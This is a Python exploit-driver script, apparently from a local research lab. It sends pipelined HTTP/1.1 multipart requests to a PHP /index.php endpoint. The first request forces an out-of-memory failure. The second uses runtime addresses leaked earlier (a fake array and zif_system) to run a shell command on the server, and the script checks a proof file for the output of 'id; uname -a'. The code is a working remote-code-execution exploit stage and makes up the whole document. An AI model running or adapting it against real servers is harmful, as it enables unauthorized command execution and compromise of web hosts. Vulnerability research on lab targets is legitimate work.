#!/usr/bin/env python3
"""Pipeline probe: send A2 and B2 back-to-back on one HTTP/1.1 connection.

A2 (cheap OOM) returns HTTP/1.0 500 with Connection: close even when the
request asked for keep-alive, so a normal keep-alive sequence cannot pin B2
to the A2 child. This probe puts both requests in the same TCP stream and
sees whether the child processes the pipelined B2 before closing.

Inputs are the runtime addresses from a B1 leak, e.g. from multi_ref_1.log:

  python3 pipeline_probe.py --s 0x7fe1bb4f8398 --zif 0x7fe1bd54f370

The script also supports a second phase that re-sends B2 on a fresh
connection, in case the A2 child survived and is reused.
"""
from __future__ import annotations

import argparse
import os
import socket
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
LAB = os.path.dirname(HERE)
PAYLOADS = os.path.join(LAB, "payloads")
sys.path.insert(0, HERE)
sys.path.insert(0, PAYLOADS)

import keepalive_probe as k  # type: ignore
import poison_chain as p  # type: ignore
from cheap_oom_a import build_body as build_a2  # type: ignore


def plain_request(host: str, port: int, body: bytes) -> bytes:
    hdr = (("POST /index.php HTTP/1.1\r\nHost: %s:%d\r\n"
            "Content-Type: multipart/form-data; boundary=%s\r\n"
            "Content-Length: %d\r\nConnection: close\r\n\r\n")
           % (host, port, k.BOUNDARY.decode(), len(body))).encode()
    return hdr + body


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18112)
    ap.add_argument("--s", required=True, help="fake array S from B1 leak")
    ap.add_argument("--zif", required=True, help="zif_system from B1 leak")
    ap.add_argument("--cmd",
                    default="rm -f /out/ka; (id; uname -a) > /out/ka 2>&1")
    args = ap.parse_args()
    s_addr = int(args.s, 0)
    zif = int(args.zif, 0)
    proof = os.path.join(LAB, "multi-out", "ka")

    a2 = build_a2(880, 64, 115, b"a" * 32, b"k0", k.BOUNDARY)
    b2 = p.build_b2(s_addr, zif, args.cmd.encode())
    print("A2=%d B2=%d S=%#x zif=%#x" % (len(a2), len(b2), s_addr, zif))
    print("cmd=%r (%d bytes)" % (args.cmd, len(args.cmd)))

    if os.path.exists(proof):
        try:
            before = os.stat(proof).st_mtime_ns
        except OSError:
            before = None
    else:
        before = None
    print("proof before:", proof, before)

    print("=== pipelined A2+B2 on one connection ===")
    s = socket.create_connection((args.host, args.port), timeout=120)
    try:
        s.sendall(plain_request(args.host, args.port, a2) +
                  plain_request(args.host, args.port, b2))
        buf = b""
        for i in range(1, 3):
            try:
                st, hd, bd, buf = k.read_response(s, buf, timeout=120)
                print("resp%d status=%r conn=%r clen=%r body=%d"
                      % (i, st[:40], hd.get(b"connection", b""),
                         hd.get(b"content-length", b""), len(bd)))
            except Exception as exc:
                print("resp%d read stopped: %r" % (i, exc))
                break
    except Exception as exc:
        print("pipeline send failed: %r" % (exc,))
    finally:
        s.close()

    time.sleep(0.5)
    after = os.stat(proof).st_mtime_ns if os.path.exists(proof) else None
    if after is not None and after != before:
        print("PIPELINE PROOF (fresh) %s:" % proof)
        print(open(proof, "r", errors="replace").read())
        return 0
    print("no fresh proof after pipeline (after=%r)" % (after,))

    print("=== phase 2: B2 on a fresh connection (A2 child reuse) ===")
    for attempt in range(1, 4):
        s = socket.create_connection((args.host, args.port), timeout=120)
        try:
            s.sendall(plain_request(args.host, args.port, b2))
            st, hd, bd, buf = k.read_response(s, b"", timeout=120)
            print("B2[%d] status=%r conn=%r" % (attempt, st[:40],
                                                hd.get(b"connection", b"")))
        except Exception as exc:
            print("B2[%d] failed: %r" % (attempt, exc))
        finally:
            s.close()
        time.sleep(0.5)
        after = os.stat(proof).st_mtime_ns if os.path.exists(proof) else None
        if after is not None and after != before:
            print("PROOF (fresh) %s:" % proof)
            print(open(proof, "r", errors="replace").read())
            return 0
    print("no fresh proof after B2 retries")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
